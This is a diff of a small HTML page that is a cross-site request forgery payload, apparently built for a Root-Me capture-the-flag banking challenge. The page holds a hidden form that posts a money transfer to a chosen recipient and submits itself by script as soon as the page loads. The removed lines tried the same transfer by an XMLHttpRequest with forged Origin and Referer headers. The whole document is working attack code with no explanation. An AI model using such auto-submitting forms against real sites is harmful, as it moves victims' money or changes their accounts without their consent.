@@ -1,20 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-    <title>CSRF Automated Transfer</title>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
 </head>
 <body>
     <form id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
         <input type="hidden" name="recipient" value="Defint4">
-        <input type="hidden" name="amount" value="50">
+        <input type="hidden" name="amount" value="1">
     </form>
     <script>
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", "/transfer/", true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.setRequestHeader("Origin", "https://bankme-1.challenges.pro.root-me.org");
-        xhr.setRequestHeader("Referer", "https://bankme-1.challenges.pro.root-me.org/profile/?message=0");
-        xhr.send("recipient=Defint4&amount=50");
+        document.getElementById('csrf-form').submit();
     </script>
 </body>
 </html>
